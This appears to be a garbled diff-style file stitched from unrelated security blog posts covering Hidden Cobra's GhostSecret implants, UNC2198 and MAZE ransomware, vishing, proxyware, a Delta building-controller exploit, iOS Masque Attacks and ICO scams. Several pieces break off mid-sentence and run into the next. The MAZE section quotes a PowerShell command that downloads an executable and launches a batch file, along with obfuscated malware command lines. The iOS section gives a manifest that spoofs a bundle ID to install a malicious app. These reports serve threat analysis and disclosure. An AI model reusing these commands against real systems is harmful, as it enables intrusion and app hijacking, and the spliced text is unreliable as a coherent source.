-The attackers behind Operation GhostSecret used a similar infrastructure to earlier threats, including SSL certificates used by FakeTLS in implants found in the Destover backdoor variant known as Escad, which was used in the Sony Pictures attack.
-Based on our technical analysis, telemetry, and data from submissions, we can assert with high confidence that this is the work of the Hidden Cobra group.
-The Advanced Threat Research team uncovered activity related to this campaign in March 2018, when the actors targeted Turkish banks.
-These initial findings appear to be the first stage of Operation GhostSecret.
-For more on the global aspect of this threat, see “Global Malware Campaign Pilfers Data from Critical Infrastructure of Entertainment, Finance, Health Care, and Other Industries.”
-Analysis The McAfee Advanced Threat Research team discovered a previously unknown data-gathering implant that surfaced in mid-February 2018.
-This implant appears to be a derivative of implants authored before by Hidden Cobra and contains functionality similar to that of Bankshot, with code overlaps from other Hidden Cobra implants.
-However, the variant is not based on Bankshot.
-Our analysis of the portable executable’s rich-header data reveals that the two implants were compiled in different development environments.
-(The PE rich header is an undocumented part of a Windows executable that reveals unique information to identify the Microsoft compiler and linker used to create the program.
-It is helpful for identifying similarities between malware variants to establish common development environments.)
-Our analysis of the code and PE rich header indicates that Bankshot, Proxysvc, and the Destover-like implant are distinct families, but also contain overlapping code and functionality with current tools of Hidden Cobra.
-PE rich header data from the 2018 Bankshot implant.
-PE rich header data from the new February 2018 implant.
-PE rich header data from Proxysvc.dll.
-When we compared the PE rich header data of the new February 2018 implant with a variant of Backdoor.
-Escad (Destover) from 2014 shortly before the Sony Pictures attack, we found the signatures to be identical.
-The Destover-like variant is 83% similar in code to a 2015 variant and contains the same rich PE header signature as the Backdoor.
-Escad variant we analyzed.
-Thus the new implant is likely a derivative of components of Destover.
-We determined that the implant is not a direct copy of well-known previous samples of Destover; rather, Hidden Cobra created a new hybrid variant using functionality present in earlier versions.
-2014 Backdoor.
-Escad (hash: 8a7621dba2e88e32c02fe0889d2796a0c7cb5144).
-2015
-Destover variant (7fe373376e0357624a1d21cd803ce62aa86738b6).
-The February implant fe887fcab66d7d7f79f05e0266c0649f0114ba7c was obtained from an unknown submitter in the United States on February 14, two days after it was compiled.
-This Korean-language file used the control server IP address 203.131.222.83.
-The implant is nearly identical to an unknown 2017 sample (8f2918c721511536d8c72144eabaf685ddc21a35) except that the control server addresses are different.
-The 2017 sample used address 14.140.116.172.
-Both implants specifically use FakeTLS with PolarSSL, which we saw in previous Hidden Cobra implants.
-PolarSSL libraries have appeared in implants since the Sony Pictures incident and were used exclusively in the implant Backdoor.
-Destover.
-This implant incorporated a custom control server protocol that sends traffic over port 443.
-The implementation does not format the packets in standard SSL, but rather in a custom format and transmitted over SSL—hence, FakeTLS.
-The control server traffic when compared to Backdoor.
-Escad is nearly identical.
-TLS traffic in Backdoor.
-Destover, the 2018 Destover-like variant.
-TLS traffic in Backdoor.
-Escad.
-Further research into IP address 14.140.116.172 leads us to additional hidden components involved in the overall infrastructure.
-Proxysvc.dll contains a list of hardcoded IP addresses, including the preceding address, all located in India.
-Despite the name, this component is not an SSL proxy, but rather a unique data-gathering and implant-installation component that listens on port 443 for inbound control server connections.
-Proxysvc was first collected by public and private sources on March 22 from an unknown entity in the United States.
-The executable dropper for the component was submitted from South Korea on March 19.
-McAfee telemetry analysis from March 16 to 21 reveals that Proxysvc components were active in the wild.
-Our research shows this listener component appeared mostly in higher education organizations.
-We suspect this component is involved in core control server infrastructure.
-These targets were chosen intentionally to run Proxysvc because the attacker would have needed to know which systems were infected to connect to them.
-This data also indicates this infrastructure had been operating for more than a year before its discovery.
-The Advanced Threat Research team found this component running on systems in 11 countries.
-Given the limited capabilities of Proxysvc, it appears to be part of a covert network of SSL listeners that allow the attackers to gather data and install more complex implants or additional infrastructure.
-The SSL listener supports multiple control server connections, rather than a list of hardcoded addresses.
-By removing the dependency on hardcoded IP addresses and accepting only inbound connections, the control service can remain unknown.
-The number of infected systems by country in which Proxysvc.dll was operating in March.
-Source: McAfee Advanced Threat Research.
-The 2018 Destover-like implant appeared in organizations in 17 countries between March 14 and March 18.
-The impacted organizations are in industries such as telecommunications, health, finance, critical infrastructure, and entertainment.
-The number of infected systems by country in which the Destover variant was operating in March.
-Source: McAfee Advanced Threat Research.
-Control Servers
-Further investigation into the control server infrastructure reveals the SSL certificate d0cb9b2d4809575e1bc1f4657e0eb56f307c7a76, which is tied to the control server 203.131.222.83, used by the February 2018 implant.
-This server resides at Thammasat University in Bangkok, Thailand.
-The same entity hosted the control server for the Sony Pictures implants.
-This SSL certificate has been used in Hidden Cobra operations since the Sony Pictures attack.
-Analyzing this certificate reveals additional control servers using the same PolarSSL certificate.
-Further analysis of McAfee telemetry data reveals several IP addresses that are active, two within the same network block as the 2018 Destover-like implant.
-Number of infections by Thammasat University – hosted control servers from March 15 – 19, 2018.
-Source: McAfee Advanced Threat Research.
-Implant Origins McAfee Advanced Threat Research determined that the Destover-like variant originated from code developed in 2015.
-The code reappeared in variants surfacing in 2017 and 2018 using nearly the same functionality and with some modifications to commands, along with an identical development environment based on the rich PE header information.
+WebClient).Downloadfile(http://<REDACTED>/<REDACTED>.exe, <REDACTED>.exe) ^
+> %SYSTEMDRIVE%\\WINDOWS\\Temp\\AVaNbBXzKyxktAZI.txt > \\WINDOWS\\Temp\\yoKjaqTIzJhdDLjD.bat & %COMSPEC% /C
+start %COMSPEC% /C
+\\WINDOWS\\Temp\\yoKjaqTIzJhdDLjD.bat UNC2198 has used Cobalt Strike BEACON, Metasploit METERPRETER, KOADIC, and PowerShell EMPIRE offensive security tools during this phase as well.
+Offensive Security Tooling UNC2198 has used offensive security tools similarly seen across many threat actors.
+UNC2198 has used BEACON in roughly 90% of their intrusions.
+UNC2198 installs and executes Cobalt Strike BEACON in a variety of ways, including shellcode loaders using PowerShell scripts, service executables, and DLLs.
+While the ways and means of using BEACON are not inherently unique, there are still aspects to extrapolate that shed light on UNC2198 TTPs.
+Focusing in on specific BEACON executables tells a different story beyond the use of the tool itself.
+Aside from junk code and API calls, UNC2198 BEACON and METERPRETER executables often exhibit unique characteristics of malware packaging, including odd command-line arguments visible within strings and upon execution via child processes: cmd.exe /c echo TjsfoRdwOe=9931 & reg add HKCU\\SOFTWARE\\WIlumYjNSyHob /v xFCbJrNfgBNqRy /t
+REG_DWORD /d 3045 & exit cmd.exe /c echo ucQhymDRSRvq=1236 & reg add HKCU\\\\SOFTWARE\\\\YkUJvbgwtylk /v KYIaIoYxqwO /tTargeted ransomware incidents have brought a threat of disruptive and destructive attacks to organizations across industries and geographies.
+FireEye
+Mandiant Threat Intelligence has previously documented this threat in our investigations of trends across ransomware incidents , FIN6 activity , implications for OT networks , and other aspects of post-compromise ransomware deployment.
+Since November 2019, we’ve seen the MAZE ransomware being used in attacks that combine targeted ransomware use, public exposure of victim data, and an affiliate model.
+Malicious actors have been actively deploying MAZE ransomware since at least May 2019.
+The ransomware was initially distributed via spam emails and exploit kits before later shifting to being deployed post-compromise.
+Multiple actors are involved in MAZE ransomware operations, based on our observations of alleged users in underground forums and distinct tactics, techniques, and procedures across Mandiant incident response engagements.
+Actors behind MAZE also maintain a public-facing website where they post data stolen from victims who refuse to pay an extortion fee.
+The combination of these two damaging intrusion outcomes—dumping sensitive data and disrupting enterprise networks—with a criminal service makes MAZE a notable threat to many organizations.
+This blog post is based on information derived from numerous Mandiant incident response engagements and our own research into the MAZE ecosystem and operations.
+Mandiant Threat Intelligence will be available to answer questions on the MAZE ransomware threat in a May 21 webinar .
+Victimology We are aware of more than 100 alleged MAZE victims reported by various media outlets and on the MAZE website since November 2019.
+These organizations have been primarily based in North America, although victims spanned nearly every geographical region.
+Nearly every industry sector including manufacturing, legal, financial services, construction, healthcare, technology, retail, and government has been impacted demonstrating that indiscriminate nature of these operations (Figure 1).
+Figure 1: Geographical and industry distribution of alleged MAZE victims Multiple Actors Involved in MAZE Ransomware Operations Identified Mandiant identified multiple Russian-speaking actors who claimed to use MAZE ransomware and were seeking partners to fulfill different functional roles within their teams.
+Additional information on these actors is available to Mandiant Intelligence subscribers .
+A panel used to manage victims targeted for MAZE ransomware deployment has a section for affiliate transactions.
+This activity is consistent with our assessment that MAZE operates under an affiliate model and is not distributed by a single group.
+Under this business model, ransomware developers will partner with other actors (i.e. affiliates) who are responsible for distributing the malware.
+In these scenarios, when a victim pays the ransom demand, the ransomware developers receive a commission.
+Direct affiliates of MAZE ransomware also partner with other actors who perform specific tasks for a percentage of the ransom payment.
+This includes partners who provide initial access to organizations and pentesters who are responsible for reconnaissance, privilege escalation and lateral movement—each of which who appear to work on a percentage-basis.
+Notably, in some cases, actors may be hired on a salary basis (vs commission) to perform specific tasks such as determining the victim organization and its annual revenues.
+This allows for specialization within the cyber criminal ecosystem, ultimately increasing efficiency, while still allowing all parties involved to profit.
+Figure 2: MAZE ransomware panel MAZE Initially Distributed via Exploit Kits and Spam Campaigns MAZE ransomware was initially distributed directly via exploit kits and spam campaigns through late 2019.
+For example, in November 2019, Mandiant observed multiple email campaigns delivering Maze ransomware primarily to individuals at organizations in Germany and the United States, although a significant number of emails were also delivered to entities in Canada, Italy, and South Korea.
+These emails used tax, invoice, and package delivery themes with document attachments or inline links to documents which download and execute Maze ransomware.
+On November 6 and 7, a Maze campaign targeting Germany delivered macro-laden documents using the subject lines “Wichtige informationen uber Steuerruckerstattung” and “1&1 Internet AG - Ihre Rechnung 19340003422 vom 07.11.19” (Figure 3).
+Recipients included individuals at organizations in a wide range of industries, with the Financial Services, Healthcare, and Manufacturing sectors being targeted most frequently.
+These emails were sent using a number of malicious domains created with the registrant address gladkoff1991@yandex.ru.
+Figure 3: German-language lure On November 8, a campaign delivered Maze primarily to Financial Services and Insurance organizations located in the United states.
+These emails originated from a compromised or spoofed account and contained an inline link to download a Maze executable payload.
+On November 18 and 19, a Maze campaign targeted individuals operating in a range of industries in the United States and Canada with macro documents using phone bill and package delivery themes (Figure 4 and Figure 5).
+These emails used the subjects “Missed package delivery” and \"Your AT&T wireless bill is ready to view\" and were sent using a number of malicious domains with the registrant address abusereceive@hitler.rocks.
+Notably, this registrant address was also used to create multiple Italian-language domains towards the end of November 2019.
+Figure 4:
+AT&T email lure Figure 5: Canada Post email lure Shift to Post-Compromise Distribution Maximizes Impact Actors using MAZE have increasingly shifted to deploying the ransomware post-compromise.
+This methodology provides an opportunity to infect more hosts within a victim’s environment and exfiltrate data, which is leveraged to apply additional pressure on organizations to pay extortion fees.
+Notably, in at least some cases, the actors behind these operations charge an additional fee, in addition to the decryption key, for the non-release of stolen data.
+Although the high-level intrusion scenarios preceding the distribution of MAZE ransomware are broadly similar, there have been notable variations across intrusions that suggest attribution to distinct teams.
+Even within these teams, the cyber criminals appear to be task-oriented meaning that one operator is not responsible for the full lifecycle.
+The following sections highlight the TTPs seen in a subset of incidents and serve to illustrate the divergence that may occur due to the fact that numerous, disparate actors are involved in different phases of these operations.
+Notably, the time between initial compromise to encryption has also been widely varied, from weeks to many months.
+Initial Compromise There are few clear patterns for intrusion vector across analyzed MAZE ransomware incidents.
+This is consistent with our observations of multiple actors who use MAZE soliciting partners with network access.
+The following are a sample of observations from several Mandiant incident response engagements: A user downloaded a malicious resume-themed Microsoft Word document that contained macros which launched an IcedID payload, which was ultimately used to execute an instance of BEACON.Between tech support requesting access to your computer, concerned tax services specialists demanding payments, medical equipment suppliers “returning your call,” and many more — none legitimate — it’s a wonder anyone even answers their phone anymore.
+You’d be hard-pressed to find someone who hasn’t experienced some form of phone scam, although the name for it isn’t as well-known: vishing.
+What is vishing?
+Vishing is short for voice plus phishing (as smishing is SMS + phishing ), and, aided by the mass transition to remote work, it has turned the phone into a major weapon of fraud, to the extent that law-enforcement agencies now periodically release official announcements about the danger.
+According to 2019 data from the US Federal Trade Commission, only 6% of scam calls ended in financial loss.
+Nevertheless, when it happened, the damage was quite significant, with a median value of $960.
+Anyone can fall for a scammer’s bait, even experts who think they’ve seen it all .
+Many fraudsters are excellent at gaining the confidence of even the most vigilant target.
+On the one hand, vishing is more conservative than regular phishing, because the telephone itself is an older means of communication.
+On the other hand, massive data leaks in the digital age have lent voice scams new power: Never before have scammers been in possession of such volumes of information about almost everyone on the planet.
+The proliferation of Internet telephony (VoIP) further plays into the hands of cybercriminals, enabling them to manipulate phone numbers and cover their tracks.
+Types of scam calls Scammers can say just about anything on a call, but their attempts tend to fall into a few main categories.
+Telemarketing Telemarketing fraud tends to involve offers too good to be true and pressure too time-sensitive to end well.
+Some examples include winning the lottery (bonus points it you didn’t even buy a ticket), a reduced credit card interest rate, and other lucrative offers that are hard to refuse.
+They tend to have in common the need to make a decision on the spot, plus a small advance payment from you to them.
+If you have the time to think about the offer, it’s (usually) clearly fraudulent.
+If you make the payment, it’ll just go to the scammers, literally rewarding them for their crime and also reinforcing the value of using leaked databases of phone numbers to call and defraud thousands more people.
+Government agency One of the most common schemes involves allegedly unpaid or underpaid taxes.
+A “tax office” initiates the call and provides a choice: Pay the arrears or face a fine.
+The offer expires soon, after which the fine will increase.
+Again, adding time-sensitivity works.
+Given time to think about how tax agencies communicate with citizens, not to mention their deadline structures, the average citizen could probably figure out that such calls are fraudulent.
+Faced with a ticking clock and (apparently) a government agency known for strictness, however, adjusts the odds in scammers’ favor.
+Technical support For unsolicited tech-support calls, scammers choose large, well-known brands to increase the chances of connecting with an actual user of the product.
+The caller typically claims to have found an issue with the victim’s computer and asks for login credentials or remote access to their computer.
+A more sophisticated scheme involves some preparation, for example, infecting a computer with malware that invokes a pop-up window with a description of the alleged problem and a phone number to call to get it fixed.
+Bank The ultimate object of any scam is money, so of course some fraudsters pretend to call from banks.
+Generally, they claim to be reporting suspicious account activity, which in reality gives them cover to request details such as a CVC/CVV code or a one-time passcode from a text message.
+Armed with such details, the fake bank employee can easily clean out an account for real.
+How to recognize scam calls We can’t discount the notion that scammers, always on the lookout for more-convincing hooks, might someday learn from fraud’s rich history of tells, but most scams exhibit at least one of several red flags.
+If a call supposedly from a bank or government agency comes from a cell number, it’s almost certainly vishing.
+Double those odds if the phone number is from a different region.
+However, an official-looking number is no guarantee of a legitimate call; modern technologies allow caller ID spoofing .
+If a caller tries to extract confidential information, especially in a threatening manner, that too is a sign of vishing.
+In general, any attempt to find out private information is an indication of fraud: any information a real bank or tax office employee needs about you, they probably already have — remember, we’re talking about communication they initiated, not you.
+If someone urges you to make a monetary transaction and cites a deadline, it’s definitely a scam.
+If a caller tries to persuade you to install software on your computer to fix some problem they called to tell you about, it will probably end badly for you.
+Finally, an indirect but still reliable sign of vishing is if the caller gets confused, misspeaks, is hostile, or uses slang expressions.
+We have nothing against everyday speech, of course, but real operators are generally trained to use professional language.
+How to guard against scam calls If you spot at least one of the above red flags, the best option is simply to end the conversation.
+After that, call the company or organization that supposedly just called you and report the incident — the more information they collect, the more likely they are to catch, or at least hinder, the fraudsters.
+Look up the tech or customer support number separately, for example by going to the organization’s official website.
+In addition, resolutely avoid installing remote access programs on your computer, however convincing any caller may be, and use a reliable security solution that detects dangerous applications in good time and warns you about them.
+
+
+Imagine getting paid for access to just a tiny portion of your Internet bandwidth at work.
+Sounds pretty sweet, doesn’t it?
+The computer is on all the time anyway, and you have unlimited Internet access, so why not?
+It’s not even your own resources, just corporate equipment and bandwidth.
+That all sounds simple, but you don’t have to look too closely to see that when you agree to install a proxyware client on a work computer, it’s not harmless at all.
+Install proxyware and you’re exposing your corporate network to risks that far outweigh any income you might earn from the deal.
+To put it bluntly, no other questionable Internet money-making scheme comes with such a variety of undesirable consequences.
+Today we explain why proxyware is dangerous.
+What is proxyware?
+Researchers at Cisco Talos coined the term proxyware and have reported on the phenomenon in depth .
+Essentially, a proxyware service acts as a proxy server.
+Installed on a desktop computer or smartphone, it makes the device’s Internet connection accessible to an outside party.
+Depending on how long the program remains enabled and how much bandwidth it is permitted to use, the client accumulates points that can eventually be converted into currency and transferred to a bank account.
+Of course, these kinds of services do not have to be used for illegal purposes, and they do have some legitimate applications.
+For example, some appeal to the marketing departments of large companies, which need as many Web entry points as possible in different geographic regions.
+Why proxyware on a company computer is a bad idea Although proxyware services claim “tenants” are harmless, problems sometimes still occur, including IP address reputation damage and software reliability.
+Pessimization of the IP address The most common problem with proxyware for the users of the computers on which it runs — or even for the entire network if it has a single IP address — is that the services often encounter CAPTCHA s, whose entire point is to ensure only real humans can get access to an online resource.
+A computer with proxyware raises suspicions, and rightly so.
+One way bandwidth tenants can use proxyware-laden computers is to scan the Web or measure the speed of website access by regularly deploying a flood of requests.
+Automatic DDoS protection systems do not like that.
+It can also be a sign of something even more shady, such as spam mailings.
+Keep in mind that the consequences can be much more dire for the company, with automated requests landing the organization’s IP address on a list of unsafe addresses.
+So, for example, if the e-mail server operates on the same address, at some point the employees’ messages may stop reaching external recipients.
+Other e-mail servers will simply start blocking the organization’s IP address and domain.
+Fake proxyware clients Another risk employees take in installing proxyware is that they may download something they didn’t mean to.
+Try this little experiment: Go to Google and search for “honeygain download.”
+You’ll get a couple of links to the developer’s official website and hundreds to unscrupulous file-sharing sites, half of which include “bonus content” with their downloads.
+What kinds of bonus content?
+Well, researchers describe one such trojanized installer as deploying a cryptocurrency-mining program (which devour a PC’s resources and electricity) and a tool to connect to the cybercriminals’ command server, from which anything else can be downloaded at any time.
+That kind of proxyware can take down an organization’s entire IT infrastructure.
+It could also lead to ransomware encrypting data, ransom demands, and more.
+In sum, proxyware is a grab bag of dangers for a business.
+Covert installation of proxyware Most scenarios resemble the above: unintended consequences of purposeful (if sometimes unauthorized) installations.
+The converse sometimes happens as well, with an employee catching actual malware on a shady site, and that malware installing a modified proxyware client on the computer.
+That’s nothing but trouble: slowed computers, less network bandwidth, and, potentially, data theft.
+Recommendations for businesses Your best way to combat criminal exploitation through proxyware is to install a reliable antivirus solution on every computer that has Internet access.
+Not only will that protect your company from the harmful effects of proxyware, but if said proxyware includes, or is included with, other malware, you’ll still be covered.
+To be clear, even “clean” proxyware is not much better.
+A sound security policy should not allow anyone to install proxyware or any other questionable software on employees’ computers, regardless of whether the computers are in the office or employees are connecting to the organization’s VPN.
+As a rule, most employees do not need, and should not be allowed, to install software on their computers independently.
+
+
+By Mark Bereza on Aug 09, 2019 Management.
+Control.
+It seems that you can’t stick five people in a room together without one of them trying to order the others around.
+This tendency towards centralized authority is not without reason, however – it is often more efficient to have one person, or thing, calling the shots.
+For an example of the latter, one needs look no further than Delta’s enteliBUS Manager, or eBMGR.
+Put simply, this device aims to centralize control for various pieces of hardware often found in corporate or industrial settings, whether it be temperature and humidity controls for a server room, a boiler and its corresponding alarms and sensors in a factory, or access control and lighting in a business.
+The advantages seem obvious, too – it can be configured to adjust fan speeds according to thermostat readings or sound an alarm if pressure crosses a certain threshold, all with little human interaction.
+The disadvantages, while less obvious, become clear when one considers tech-savvy malicious actors.
+Suddenly, your potentially critical system now has a single point of failure, and one that is attached to a network, to make matters worse.
+Consider for a moment a positive pressure room in a hospital, the kind typically used to keep out contaminants during surgeries.
+Managing rooms such as these is a typical application for the eBMGR and it does not take an overactive imagination to envision what kind of damage a bad actor could cause if they disrupted such a sensitive environment.
+Management.
+Control.
+That’s what’s at stake if a device such as this is not properly secured.
+It’s also what made this device such a high priority for McAfee’s Advanced Threat Research team.
+The decision to make network-connected critical systems such as these demands an extremely high standard of software security – finding where it might fall short is precisely our job.
+With these stakes in mind, our team went to work.
+We began by hooking up an eBMGR unit to a network with several other devices to simulate an environment somewhat true to life.
+Using a technique known as “fuzzing”, we then blasted the device with all kinds of deliberately malformed network traffic, looking for a chink in the armor.
+That is one advantage often afforded to the bad guys in software security; they can make many mistakes; manufacturers need only make one.
+Perhaps unsurprisingly, persistence and creativity led us to discover one such mistake: a mismatch in the memory sizes used to handle incoming network data created what is often referred to as a buffer overflow vulnerability.
+This seemingly innocuous mistake rendered the eBMGR vulnerable to our carefully crafted network attack, which allows a hacker on the same network to gain complete control of the device’s operating system.
+Worse still, the attack uses what is known as broadcast traffic, meaning they can launch the attack without knowing the location of the targets on the network.
+The result is a twisted version of Marco Polo – the hacker needs only shout “Marco!”
+into the darkness and wait for the unsuspecting targets to shout “Polo!”
+in response.
+In this field, complete control of the operating system is typically the finish line.
+But we weren’t content with just that.
+After all, controlling the eBMGR on its own is not all that interesting; we wanted to see if we could use it to control all the devices it was connected to.
+Unfortunately, we did not have the source code for the device’s software, so this new goal proved non-trivial.
+We went back to the drawing board and acquired some additional hardware that the Delta device might realistically be charged with managing and had a certified technician program the device just as he would for a real-world client – in our case, as an HVAC controller.
+Our strategy quickly became what is often referred to as a replay attack.
+As an example, if we wanted to determine how to tell the device to flip a switch, we would first observe the device flipping the switch in the “normal” way and try to track down what code had to run for that to happen.
+Next, we would try to recreate those conditions by running that code manually, thus replaying the previously observed event.
+This strategy proved effective in granting us control over every category of device the eBMGR supports.
+Moreover, this method remains agnostic to the specific hardware attached to the building manager.
+Hypothetically, this sort of attack would work without any prior knowledge of the device’s configuration.
+The result was an attack that would compromise any enteliBUS Manager on the same network and attach a custom piece of malware we developed to the software running on it.
+This malware would then create a backdoor which would allow the attacker to remotely issue commands to the manager and control any hardware connected to it, whether it be something as benign as a light switch or as dangerous as a boiler.
+To make matters worse, if the attacker knows the IP address of the device ahead of time, this exploit can be performed over the Internet, increasing its impact exponentially.
+At the time of this writing, a Shodan scan revealed that over 1600 such devices are internet connected, meaning the danger is far from hypothetical.
+For those craving the nitty-gritty technical details of how we went about accomplishing this, we also published what is arguably a novella here that delves into the vulnerability discovery and exploitation process from start to finish.
+In keeping with our responsible disclosure program , we reached out to Delta Controls as soon as we confirmed that the initial vulnerability we discovered was exploitable.
+Shortly thereafter, they provided us with a beta version of a patch meant to fix the vulnerability and we confirmed that it did just that – our attack no longer worked.
+Furthermore, by using our understanding of how the attack is performed at a network level, we were able to add mitigation for this vulnerability to McAfee’s Network Security Platform (NSP) via NSP signature 0x45d43f00, helping our customers remain secure.
+This is our idea of a success story – researchers and vendors coming together to improve security for end users and ultimately reduce the attack surface for the adversary.
+If there’s any doubt they are interested in targets like these, a quick search will illuminate the myriad attempts to exploit industrial control systems as a top target of interest.
+Before we leave you with “all’s well that ends well”, we want to stress that there is a lesson to be learned here: it doesn’t take much to make a critical system vulnerable.
+Thus, it is important that companies extend proper security practices to all network-connected devices – not just PCs.
+Such practices might include placing all internet-connected devices behind a firewall, monitoring traffic to these devices, segregating them from the rest of the network using VLANs, and staying on top of security updates.
+For critical systems that cannot afford significant downtime, updates are often pulled instead of pushed, putting the onus on end users to keep these devices up to date.In the recent release of iOS 8.4, Apple fixed several vulnerabilities including vulnerabilities that allow attackers to deploy two new kinds of Masque Attack (CVE-2015-3722/3725, and CVE-2015-3725).
+We call these exploits Manifest Masque and Extension Masque, which can be used to demolish apps, including system apps (e.g., Apple Watch, Health, Pay and so on), and to break the app data container.
+In this blog, we also disclose the details of a previously fixed, but undisclosed, masque vulnerability: Plugin Masque, which bypasses iOS entitlement enforcement and hijacks VPN traffic.
+Our investigation also shows that around one third of iOS devices still have not updated to versions 8.1.3 or above, even 5 months after the release of 8.1.3, and these devices are still vulnerable to all the Masque Attacks.
+We have disclosed five kinds of Masque Attacks, as shown in the following table.
+Name Consequences disclosed till now Mitigation status App Masque * Replace an existing app * Harvest sensitive data Fixed in iOS 8.1.3 [6] URL Masque * Bypass prompt of trust
+* Hijack inter-app communication Partially fixed in iOS
+8.1.3 [11] Manifest Masque * Demolish other apps (incl.
+Apple Watch, Health, Pay, etc.)
+during over-the-air installations Partially fixed in iOS 8.4 Plugin Masque * Bypass prompt of trust * Bypass VPN plugin entitlement * Replace an existing VPN plugin * Hijack device traffic * Prevent device from rebooting * Exploit more kernel vulnerabilities Fixed in iOS 8.1.3 Extension Masque * Access another app’s data * Or prevent another app to access its own data Partially fixed in iOS 8.4 Manifest Masque Attack leverages the CVE-2015-3722/3725 vulnerability to demolish an existing app on iOS when a victim installs an in-house iOS app wirelessly using enterprise provisioning from a website.
+The demolished app (the attack target) can be either a regular app downloaded from official App Store or even an important system app, such as Apple Watch, Apple Pay, App Store, Safari, Settings, etc.
+This vulnerability affects all iOS 7.x
+and iOS 8.x versions prior to iOS 8.4.
+We first notified Apple of this vulnerability in August 2014.
+Extension Masque Attack can break the restrictions of app data container.
+A malicious app extension installed along with an in-house app on iOS 8 can either gain full access to a targeted app’s data container or prevent the targeted app from accessing its own data container.
+On June 14, security researchers Luyi, Xiaofeng et al. disclosed several severe issues on OS X, including a similar issue with this one [5].
+They did remarkable research, but happened to miss this on iOS.
+Their report claimed: “this security risk is not present on iOS ”.
+However, the data container issue does affect all iOS 8.x versions prior to iOS 8.4, and can be leveraged by an attacker to steal all data in a target app’s data container.
+We independently discovered this vulnerability on iOS and notified Apple before the report [5] was published, and Apple fixed this issue as part of CVE-2015-3725.
+In addition to these two vulnerabilities patched on iOS 8.4, we also disclose the detail of another untrusted code injection attack by replacing the VPN Plugin, the Plugin Masque Attack.
+We reported this vulnerability to Apple in Nov 2014, and Apple fixed the vulnerability on iOS 8.1.3 when Apple patched the original Masque Attack (App Masque)
+[6, 11].
+However, this exploit is even more severe than the original Masque Attack.
+The malicious code can be injected to the neagent process and can perform privileged operations, such as monitoring all VPN traffic, without the user’s awareness.
+We first demonstrated this attack in the Jailbreak Security Summit [7] in April 2015.
+Here we categorize this attack as Plugin Masque Attack.
+We will discuss the technical details and demonstrate these three kinds of Masque Attacks.
+Manifest Masque: Putting On the New, Taking Off the Old To distribute an in-house iOS app with enterprise provisioning wirelessly, one has to publish a web page containing a hyperlink that redirects to a XML manifest file hosted on an https server [1].
+The XML manifest file contains metadata of the in-house app, including its bundle identifier, bundle version and the download URL of the .ipa file, as shown in Table 1.
+When installing the in-house iOS app wirelessly, iOS downloads this manifest file first and parse the metadata for the installation process.
+<a href=\"itms-services://?action=downloadmanifest&url=
+https://example.com/manifest.
+plist\">Install
+App</a> <plist> <array> <dict> ...
+<key>url</key> <string>
+https://XXXXX.com/another_browser.ipa</string> ... <key>bundle-identifier</key> <string
+>com.google.chrome.ios</string> … <key>bundle-version</key> <string>1000.0</string> </dict>
+<dict> … Entries For Another App </dict> <array> </plist
+> Table 1.
+An example of the hyperlink and the manifest file According to Apple’s official document [1], the bundle-identifier field should be “Your app’s bundle identifier, exactly as specified in your Xcode project”.
+However, we have discovered that iOS doesn’t verify the consistency between the bundle identifier in the XML manifest file on the website and the bundle identifier within the app itself.
+If the XML manifest file on the website has a bundle identifier equivalent to that of another genuine app on the device, and the bundle-version in the manifest is higher than the genuine app’s version, the genuine app will be demolished down to a dummy placeholder, whereas the in-house app will still be installed using its built-in bundle id.
+The dummy placeholder will disappear after the victim restarts the device.
+Also, as shown in Table 1, a manifest file can contain different apps’ metadata entries to distribute multiple apps at a time, which means this vulnerability can cause multiple apps being demolished with just one click by the victim.
+By leveraging this vulnerability, one app developer can install his/her own app and demolish other apps (e.g. a competitor’s app) at the same time.
+In this way, attackers can perform DoS attacks or phishing attacks on iOS.
+Figure 1.
+Phishing Attack by installing “malicious Chrome” and demolishing the genuine one Figure 1 shows an example of the phishing attack.
+When the user clicks a URL in the Gmail app, this URL is rewritten with the “googlechrome-x-callback://” scheme and supposed to be handled by Chrome on the device.
+However, an attacker can leverage the Manifest Masque vulnerability to demolish the genuine Chrome and install “malicious Chrome” registering the same scheme.
+Other than requiring the same bundle identifier to replace a genuine app in the original Masque Attack [xx], the malicious chrome in this phishing attack uses a different bundle identifier to bypass the installer’s bundle identifier validation.
+Later, when the victim clicks a URL in the Gmail app, the malicious Chrome can take over the rewritten URL scheme and perform more sophisticated attacks.
+What’s worse, an attacker can also exploit this vulnerability to demolish all system apps (e.g. Apple Watch, Apple Pay UIService, App Store, Safari, Health, InCallService, Settings, etc.).
+Once demolished, these system apps will no longer be available to the victim, even if the victim restarts the device.
+Here we demonstrate this DoS attack on iOS 8.3 to demolish all the system apps and one App Store app (i.e. Gmail) when the victim clicks only once to install an in-house app wirelessly.
+Note that after rebooting the device, all the system apps still remain demolished while the App Store app would disappear since it has already been uninstalled.
+Extension Masque: Breaking The Data Container Apple introduces the app extension feature [2] on iOS 8.
+Different\ntypes of the app extension provide various new ways for the developer\nto extend the app’s functionality on iOS 8.
+For example, the app can\nappear as a widget on the Today screen, add new buttons in the Action\nsheet, offer photo filters within the iOS
+Photos app, or display a new\nsystem-wide custom keyboard [3].
+In addition, the watch extension [4]\non iPhone delegates all logic of a watch app on iOS 8.2/8.3 after the\nrelease of Apple Watch.
+An app extension can execute code and is\nrestricted to access data within its data container.
+Extensions are\ndistributed as a part of the iOS app, which can be leveraged as\npotential new attack vectors by attackers.Following the helicopter money and fake cryptocurrency exchange scams, the Discord scam saga continues, this time with cybercriminals hitting ICO investors.
+What ICOs are, and how they work ICO is short for Initial Coin Offering .
+Before making them available for free trading on cryptoexchanges, makers of new cryptocurrencies release some tokens — typically to raise initial funds for the project.
+On the buyer side, speculators are hoping to profit — that the market rate will increase.
+That makes ICOs similar to IPOs (initial public offerings) on the stock market.
+The ICO concept is gaining momentum.
+According to PwC analysts , ICOs increased from only 49 ICOs in 2016 to more than 1,000 in 2018.
+The financial increase is no less impressive: from $252 million to $19.7 billion.
+ICO types Several initial placement options are available.
+Broadly, there are capped and uncapped placements.
+In the former case, the issuer clearly states the sum to be collected and the number of tokens up for trading — as a result, there may not be enough coins to cover the demand.
+Uncapped placements continue, as the name suggests, nonstop throughout the ICO.
+The organizers never stop collecting money, hoping to bring in as many investors and as much money as possible.
+But an unlimited supply may dampen investor interest, of course, so organizers have to hype the placement.
+There are also several distribution options.
+For example, in some ICOs, advance requests are processed based on an FCFS (First Come First Serve) basis; in others, whoever offers the highest price wins the assets at auction.
+Then we have the randomized queue, an alternative format that’s been gaining traction of late, in which the traders register on the project website well in advance but learn their number only after they are in the queue and trading begins.
+In other words, potential cryptoinvestors can’t know until the last moment whether they will get the coveted assets.
